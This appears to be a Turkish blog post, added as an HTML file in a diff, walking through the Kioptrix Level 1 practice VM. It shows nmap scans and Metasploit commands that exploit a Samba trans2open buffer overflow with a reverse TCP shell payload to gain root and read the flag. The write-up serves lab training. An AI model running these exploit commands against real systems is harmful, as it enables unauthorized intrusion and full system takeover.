@@ -1,0 +1,165 @@
+<!DOCTYPE html>
+<html>
+
+  <head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <title>Kioptrix Level 1 Writeup</title>
+  <meta name="description" content="      Kioptrix, içerisindeki çeşitli zafiyetleri istismar ettiğimiz, bunlar sayesinde erişimler elde edebildiğimiz ve bu şekilde sistemi ele geçirmeye çalışt...">
+
+  <link rel="stylesheet" href="/css/main.css">
+  <link rel="canonical" href="http://localhost:4000/tr/2017/04/26/kioptrix-level-1.html">
+  <link rel="alternate" type="application/rss+xml" title="Hakan Bayır" href="http://localhost:4000/feed.xml">
+
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-101246969-1', 'auto');
+  ga('send', 'pageview');
+
+</script>
+
+</head>
+
+
+  <body>
+      <div class="outer">
+        <header class="site-header">
+
+  <div class="wrapper">
+
+    <a class="site-title" href="/">Hakan Bayır</a>
+    
+  </div>
+
+
+
+
+  <div class="header-badge">
+    <a href="/">
+        <img src="/assets/test.jpg" />
+    </a>
+  </div>
+
+    
+</header>
+
+
+        <div class="page-content">
+          <div class="wrapper">
+            <article class="post card" itemscope itemtype="http://schema.org/BlogPosting">
+ <div class="card-content">
+  <header class="post-header">
+    <h1 class="post-title" itemprop="name headline">Kioptrix Level 1 Writeup</h1>
+    <p class="post-meta"><time datetime="2017-04-26T00:00:00+03:00" itemprop="datePublished">Apr 26, 2017</time></p>
+  </header>
+
+  <div class="post-content" itemprop="articleBody">
+    <p>      <strong>Kioptrix</strong>, içerisindeki çeşitli zafiyetleri istismar ettiğimiz, bunlar sayesinde erişimler elde 
+edebildiğimiz ve bu şekilde sistemi ele geçirmeye çalıştığımız bir sanal makine uygulamasıdır.
+Bu yazımda Kioptrix <strong>Level 1</strong> sanal makinesi çözümünü yapacağım. Sanal makineyi <a href="http://www.kioptrix.com/blog/test-page/">şu</a> bağlantı 
+üzerinden indirebilirsiniz.</p>
+
+<p>      Öncelikle sanal makinenin ağ üzerinde hangi ip adresini aldığını öğrenmek için <strong>nmap</strong> aracıyla
+genel bir ağ taraması yapıyoruz.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap -sV -T4 192.168.0.0/24
+</code></pre></div></div>
+
+<p><img src="/img/kioptrix/hedef-tespiti.png" /></p>
+
+<p>      Bu ağ taraması sonucuna göre Kioptrix Level 1 sanal makinasının aldığı ip adresi 192.168.0.22 olarak
+görünüyor. Bu bilgiyi kullanarak şimdi açık portları tespit etmek için başka bir tarama yapacağız.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap -sV -T4 192.168.0.22 --open
+</code></pre></div></div>
+
+<p><img src="/img/kioptrix/hedef-tarama.png" /></p>
+
+<p>      Bu işlem sonucunda açık olan portları aşağıdaki gibi listeliyoruz.  <strong>Netbios-ssn</strong> servisi
+üzerinden işlem yapmaya çalışacağız. Burada sambanın bu sürümünde bulunan <strong>arabellek taşması(buffer overflow)</strong>
+açığı istismar edilecektir.</p>
+
+<table>
+  <tbody>
+    <tr>
+      <td>139/tcp</td>
+      <td>open</td>
+      <td>netbios-ssn</td>
+      <td>Samba smbd (workgroup: MYGROUP)</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>      <strong>Metasploit Framework</strong> üzerinde <strong>exploit</strong> aramaya başlıyoruz.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf&gt; search samba
+</code></pre></div></div>
+
+<p><img src="/img/kioptrix/search-exploit.jpeg" /></p>
+
+<p>      Burada listelenen çözümlerden sistemimiz ile ilgili olan seçiyoruz.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf&gt;  use exploit/linux/samba/trans2open
+</code></pre></div></div>
+
+<p>      Bu aşamada kullandığımız exploit sayesinde samba servisi açığından yararlanabiliyoruz fakat
+hedef sistem üzerinde bir kontrol elde edemiyoruz. Burada hedef sisteme sızmayı sağlayan ve 
+istediğimiz işlemleri gerçekleştirmemizi sağlayan <strong>payload</strong>lardan birini kullanmamız gerekiyor.
+Uygun olabilecek payloadları aratıyoruz ve buradan <strong>reverse_tcp</strong> seçimini yapıp hedefe karşı bir
+reverse shell uygulaması yapacağız. Hedefin tepkisi sonucu terminalden bir reverse shell bağlantısı
+kurulacak. Sonrasında eklememiz gereken parametreleri görmek ve eklemek için aşağıdaki adımları
+uyguluyoruz.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf&gt; show payloads
+msf&gt; set PAYLOAD generic/shell_reverse_tcp
+msf&gt; options
+msf&gt; set RHOST 192.168.0.18
+msf&gt; set LHOST 192.168.0.14
+msf&gt; run
+</code></pre></div></div>
+
+<p><img src="/img/kioptrix/search-payload.jpeg" /></p>
+
+<p><img src="/img/kioptrix/options.jpeg" /></p>
+
+<p><img src="/img/kioptrix/root-erisim.jpeg" /></p>
+
+<p>      Belli bir süre devam eden işlem sonucunda hedefe root erişimi sağlıyoruz. Artık içeride 
+bulunmak istenen mesajı aramaya başlıyoruz. Önemli gördüğümüz dizinler arasında dolanırken
+gözümüze <strong>var</strong> dizini takılıyor . Buraya girdiğmizde <strong>mail</strong> adlı bir dosya daha görüyoruz. Bunun da
+içerisine girdiğmizde dosya tipi <strong>ASCII mail text</strong> olan ‘<strong>root</strong>’ adlı bir dosya görüyoruz. Bunu 
+okuduğumuzda bu  makinenin <strong>FLAG</strong> değerine ulaşıyoruz.</p>
+
+<p><img src="/img/kioptrix/sonuc1.jpeg" />
+<img src="/img/kioptrix/sonuc2.jpeg" /></p>
+
+
+  </div>
+</div>
+</article>
+
+          </div>
+        </div>
+
+        <footer class="site-footer">
+
+  <div class="wrapper">
+
+    <span class="footer-heading">Hakan Bayır</span>
+    <span class="footer-heading">2017 - 2018</span>
+
+  </div>
+
+</footer>
+
+      </div>
+  </body>
+  
+</html>
